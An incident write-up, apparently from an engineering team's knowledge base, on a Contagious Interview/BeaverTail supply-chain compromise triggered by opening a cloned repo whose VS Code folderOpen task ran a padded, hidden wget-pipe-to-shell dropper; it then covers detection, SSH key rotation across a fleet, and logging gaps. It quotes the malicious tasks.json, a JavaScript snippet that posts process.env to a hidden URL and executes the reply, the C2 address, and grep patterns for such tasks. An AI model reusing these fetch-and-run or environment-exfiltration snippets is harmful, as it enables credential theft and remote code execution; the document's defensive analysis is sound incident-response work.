---
module: Operator Workstation / web-platform infra
date: 2026-07-28
problem_type: security_issue
component: development_workflow
symptoms:
  - "node ~/.vscode/env-setup.js beaconing to 54.39.43.117:1224 every 5s for 24h"
  - "Opening a cloned repo in Cursor executed a remote shell script with no prompt"
  - "SSH_AUTH_SOCK present in exfiltrated process.env with all keys agent-loaded"
  - "Google Gemini API key still answered HTTP 200 after the editor holding it was deleted"
root_cause: config_error
resolution_type: config_change
severity: critical
rule_id: hr-verify-repo-capability-claim-before-assert
synced_to: [go]
tags:
  - supply-chain
  - vscode-tasks
  - folderopen-rce
  - ssh-agent
  - key-rotation
  - contagious-interview
  - incident-response
---

# `.vscode/tasks.json` `runOn: folderOpen` is a zero-interaction RCE — and rotating one host is not rotating the fleet

## Problem

On 2026-07-27 11:58 the operator cloned `earniverse-org/jackpot` and **opened the folder in Cursor**. That alone was sufficient to compromise the machine. No `npm install`, no running the project.

`.vscode/tasks.json` carried two tasks with `"runOn": "folderOpen"`:

```jsonc
{ "label": "version-update", "command": "npm install --silent --no-progress",
  "runOptions": { "runOn": "folderOpen" },
  "presentation": { "reveal": "silent", "echo": false, "clear": true } },
{ "label": "env",
  "linux": {  /* ~450 spaces */  "command": "wget -qO- 'https://vscode-check-mo2.vercel.app/api/settings/linux' | sh" },
  "runOptions": { "runOn": "folderOpen" } }
```

Two concealment layers, both deliberate:

1. The `command` was padded **~450 spaces** to the right on a line that reads as benign at column 0.
2. The **same repo** shipped `.vscode/settings.json` with `"editor.wordWrap": "off"` — guaranteeing the payload stayed off-screen.

`package.json` added a third trigger: `"prepare": "start /b node server || nohup node server &"` — npm runs `prepare` after `install`, and `nohup … &` detaches it.

The dropper wrote `~/.vscode/env-setup.js` (obfuscated), which beaconed `JSON.stringify(process.env)` plus hostname/MAC/OS to `http://54.39.43.117:1224/api/checkStatus` every 5 seconds and `eval()`'d the response. It ran for **24h 25m**.

Signatures place this in the **Contagious Interview / BeaverTail** family: port `1224`, `/api/checkStatus`, and the base64 marker `bm93IGl0IHRpbWUgdG8gZ2V0IGV2ZXJ5dGhpbmc=` → *"now it time to get everything"*.

A sibling repo (`TarsAI-hub/AgentMesh`) carried the same `folderOpen` trap **plus** an in-repo RCE at module load:

```js
const setApiKey = (s) => atob(s);                        // base64-hidden URL
const verify = (api) => axios.post(api, { ...process.env }, // POSTs the whole env
                        { headers: { "x-app-request": "ip-check" } });
// routes/api/auth.js, top-level — fires on require(), i.e. on server start
verify(setApiKey(process.env.AUTH_API)).then((r) => {
  const executor = new Function("require", r.data);       // executes the reply
  executor(require);
});
```

## Outcome: exposed, not breached

Every check that *could* come back positive came back negative:

| Check | Result |
|---|---|
| `journalctl -u ssh` on web-1, window `2026-07-27 11:50` → `2026-07-28 12:23` | **zero** auth events (last prior: Jul 24 22:13) |
| Journal retention | verified to start `2026-07-21 18:05` — covers the window |
| `/root/.ssh/authorized_keys` mtime | `2026-05-20` — untouched |
| Doppler activity, 100 entries | only operator mutations |
| `~/.aws` static keys | already dead (`InvalidClientTokenId`) |
| New users / persistence | none — no systemd unit, autostart, cron, or rc injection |

Everything was rotated because it was **exposed**, not because it was **used**.

## Key insights

### 1. `runOn: folderOpen` executes in every VS Code fork

Cursor and Windsurf both honour it. The mitigation is one setting:

```jsonc
"task.allowAutomaticTasks": "off"
```

Deleting the editor also works but is a bigger hammer; the setting lives in the user config, so it **does not survive** reinstalling the editor or installing a different fork.

Reading `tasks.json` safely requires defeating the padding:

```bash
git clone --no-checkout <url> && cd <repo> && git checkout HEAD -- .
cat .vscode/tasks.json | fold -w 200      # or read with wordWrap ON
grep -rn "runOn\|folderOpen\|curl.*|.*sh\|wget.*|.*sh" .vscode/
grep -nE '"(pre|post)?(install|prepare)"' package.json
```

### 2. An unlocked ssh-agent nullifies key passphrases

`SSH_AUTH_SOCK` was in the exfiltrated `process.env`, and the agent had run **continuously for 10 days** holding every key. Any process running as the user could ask it to sign — no private key, no passphrase needed.

The consequence for triage: **initial risk ranking by passphrase was exactly backwards.** The passphrase-less `deploy_ed25519` turned out to be authorized *nowhere* (a pre-May-20 leftover). The passphrase-protected `id_ed25519` was root on four hosts and was the one that mattered.

**Corollary — `ssh-add -D` does not hold.** Under `gnome-keyring` / `gcr-ssh-agent` the keys repopulate within seconds, while `ssh-add -D` prints `All identities removed`. The flush reads like containment and isn't. Removing the private key *files* from `~/.ssh` is what stops repopulation.

### 3. "Deleted locally" never means "revoked remotely"

Hit **four times in one session**:

| Deleted locally | Still live |
|---|---|
| Mobius SSH key (shredded) | until Mobius revokes the pubkey their side |
| `~/.aws/credentials` | (already dead — but only because we tested) |
| Cursor config holding a Gemini API key | **HTTP 200** after the app was deleted; died only when the right GCP project was removed |
| Dropbox `~/.dropbox/host.db` | cloud-side access to the whole account |

Always test the credential against its provider rather than inferring from local state:

```bash
curl -s -o /dev/null -w "%{http_code}\n" "https://generativelanguage.googleapis.com/v1beta/models?key=$K"
AWS_CONFIG_FILE=/dev/null aws sts get-caller-identity   # bypasses an SSO profile masking static keys
```

A `429 RESOURCE_EXHAUSTED` means the key **authenticated** and hit quota — it is *not* revocation. Only `400 API_KEY_INVALID` / `403` is.

### 4. Rotating one host is not rotating the fleet

The same operator key was root on **web-1, grok-dogfood, inngest, web-2** and `soleur-registry`. On grok-dogfood and inngest it was the **only** root key — a delete-before-add sequence would have caused permanent lockout.

The safe sequence, used on every host:

```bash
# 1. append  (with backup)
cp -a "$AK" "$AK.bak-$(date +%Y%m%d)"; grep -qxF "$K" "$AK" || printf '%s\n' "$K" >> "$AK"
# 2. verify the NEW key authenticates INDEPENDENTLY
ssh -o BatchMode=yes -o IdentitiesOnly=yes -i ~/.ssh/new_key root@host 'echo ok'
# 3. remove old — connecting WITH the new key, guarded on the new key surviving
# 4. verify old is denied
```

Enumerate the fleet **before** the first removal: `hcloud server list` plus per-host `authorized_keys`. `soleur-registry` is deny-all-public and was reachable only via `ssh -J root@web-1 root@10.0.1.30`.

Also latent: `hcloud_ssh_key.default` (the project key) is injected into **newly created** hosts, so leaving the compromised key there re-introduces it on the next `web-2` cattle recreate.

### 5. Absence of evidence needs an instrumentation check first

The planned Better Stack query for sshd auth would have returned **empty** — not because nothing happened, but because `sshd` is in no Vector allowlist. Source 2 filters `PRIORITY 0-2` (CRIT+) and `Accepted publickey` is PRIORITY 6.

An empty result would have been indistinguishable between *"no intrusion"* and *"not instrumented"* — the worse of the two failures. Before reading silence as safety:

```bash
journalctl --list-boots                     # does retention cover the window?
journalctl -u ssh -o json -n 200 | jq -r .SYSLOG_IDENTIFIER | sort -u
```

This produced **PR #7039**.

### 6. `terraform -replace` applies *all* pending diffs

The `web-platform` root carries **37-add / 3-change / 7-destroy** of pre-existing drift; an untargeted apply would replace running prod hosts. Always scope it:

```bash
terraform apply -replace=tls_private_key.ci_ssh \
  -target=tls_private_key.ci_ssh \
  -target=doppler_secret.deploy_ssh_private_key \
  -target=terraform_data.root_authorized_keys
```

Two traps this file documents about itself and both fired:

- `ci-ssh-key.tf`'s header states rotation **leaves the old pubkey** in `authorized_keys` ("filed as deferral"). Rotation alone does not revoke.
- `terraform_data.root_authorized_keys` is **web-1-scoped**, so web-2 held the *old* CI key and never received the new one. Removing the old without appending the new first would have cut CI off from web-2 silently.

### 7. `grep` can silently skip a text file

`ugrep` runs with `-I` (skip binary). `apps/web-platform/test/infra/vector-pii-scrub.test.sh` is reported by `file` as `a bash script executable (binary data)`, so **every grep against it returned empty** — making the AC3 tag-set drift guard look like it didn't exist. That nearly shipped `vector.toml` without its lockstep `SYSTEMD_UNIT_IDENTIFIERS` change, which would have failed CI with `tag-set drift`.

```bash
grep -a -n "PATTERN" file.sh      # force text mode
file file.sh                      # confirm why it was skipped
```

**When grep returns empty on a file you know contains the string, that is a tooling result, not a finding.**

## Solution

Shipped:

- **PR #7038** — `lifecycle { ignore_changes = [ssh_keys] }` on `inngest-host.tf`, `zot-registry.tf`, `git-data.tf`. `ssh_keys` is create-time, so a key-ID change is unappliable to a running host and Terraform resolves it as a **replace** — cascading to the 10 GB Redis AOF and 60 GB LUKS registry volume attachments. Verified by plan before/after: the `ssh_keys` trigger is gone, the deliberate `user_data` replace-to-reprovision path is preserved.
- **PR #7039** — `sshd` into the Vector Source 4 `SYSLOG_IDENTIFIER` allowlist plus `SYSTEMD_UNIT_IDENTIFIERS` in the drift-guard test. `sshd(8)` sets its identifier natively so AC3 cannot derive it from `infra/*.sh` — the two files are a lockstep pair. Quota measured, not estimated: 375 rows/7d ≈ 53/day, 62 of them `Accepted`/`Failed`.

Operationally: 4 hosts rotated and verified, GitHub SSH key + token rotated, Doppler token revoked/reissued, hcloud project key swapped (+ `terraform import`), Gemini key revoked, editors removed, implant quarantined read-only and non-executable.

## Prevention

- Set `"task.allowAutomaticTasks": "off"` in **every** VS Code fork, and re-apply after any reinstall.
- Inspect `.vscode/` with `fold -w 200` before opening an unfamiliar repo — right-padding defeats a column-0 skim.
- Treat any agent-loaded key as compromised when the host is; passphrases buy nothing against a live `SSH_AUTH_SOCK`.
- Test credentials against their provider before declaring them revoked.
- Enumerate the whole fleet before removing any key; append → verify → remove → verify-denied, never delete-first.
- Check instrumentation coverage **before** interpreting an empty telemetry query.

## Session Errors

- **Heredoc overrode a pipe, so a remote script silently no-op'd.** `cat pub | ssh … 'bash -s' <<'REMOTE'` — the heredoc claimed stdin, `$(cat)` read empty, output was zero and no backup file appeared. Recovery: passed the value as a positional arg (`bash -s -- "$PUB"`). **Prevention:** never mix a pipe and a heredoc on one `ssh` call; verify a remote side-effect (backup file present) rather than trusting exit 0.
- **Advised `aws sso login` for a Cloudflare R2 backend.** The root is `backend "s3"` pointed at `…r2.cloudflarestorage.com` with no AWS provider; the fix was R2 keys from Doppler as bare `AWS_*` env vars. **Prevention:** read the `backend` block before diagnosing backend auth — an S3-shaped backend is not necessarily AWS.
- **`doppler auth revoke` put in a runbook; it is not a subcommand** (correct: `doppler logout`). **Prevention:** `--help` a CLI verb before writing it into a runbook.
- **Claimed Doppler logs every secret read.** It logs mutations only, which changed what a clean audit result *proved*. **Prevention:** verify audit-log semantics before letting a clean log stand as evidence of non-access.
- **Recommended `ssh-add -D` as containment; it silently didn't hold.** `gcr-ssh-agent` repopulated all keys within seconds while printing `All identities removed`. **Prevention:** re-read agent state after any agent mutation; treat gnome-keyring as an independent key source.
- **First `terraform plan` failed with 26 unset variables** — invoked without `--name-transformer tf-var`. **Prevention:** check how CI invokes terraform before running it locally.
- **Ranked key risk from terraform/spec docs instead of the live host.** `deploy_ed25519` was called prod-root; the host said authorized nowhere, while the under-rated `id_ed25519` was root on four hosts. **Prevention:** `hr-verify-repo-capability-claim-before-assert` applies to infra *state*, not just repo capability — enumerate live `authorized_keys` before ranking key risk.
- **Rotated web-1 before enumerating the fleet.** Three more hosts trusted the same key; on two it was the only one. **Prevention:** enumerate every host that trusts a key before the first removal.
- **`grep` silently skipped a shell script as binary** (`ugrep -I`), making the AC3 drift guard look nonexistent. **Prevention:** when grep returns empty on a file you know contains the string, re-run with `-a` and check `file`.
- **`chmod -R a-x` silently failed on files, hidden by `2>/dev/null`** — the malware dropper stayed executable after being reported neutralized. **Prevention:** `hr-when-a-command-exits-non-zero-or-prints` — do not suppress stderr on a security-relevant mutation; verify with a follow-up `find -perm`.
- **`worktree-manager.sh` hung on an interactive `y/n`.** **Prevention:** already covered by `hr-the-bash-tool-runs-in-a-non-interactive`; pipe `echo y |`.

## See also

- `2026-04-03-terraform-data-remote-exec-drift-encrypted-ssh-key.md` — encrypted-key drift on the same provisioner chain
- `2026-03-20-ssh-forced-command-cloud-init-parity-gaps.md` — `restrict,command=` parity, the mechanism whose *root* copy this incident found un-migrated
- `2026-05-20-l3-network-fix-vs-l7-credential-fix-on-ssh-provisioner-chain.md` — the `DEPLOY_SSH_PUBLIC_KEY` mismatch this incident finally cleaned up
- `knowledge-base/project/learnings/workflow-patterns/2026-07-08-self-pull-observability-in-diagnostic-loops-never-ask-operator-to-fetch.md` — the rule that made the sshd gap visible
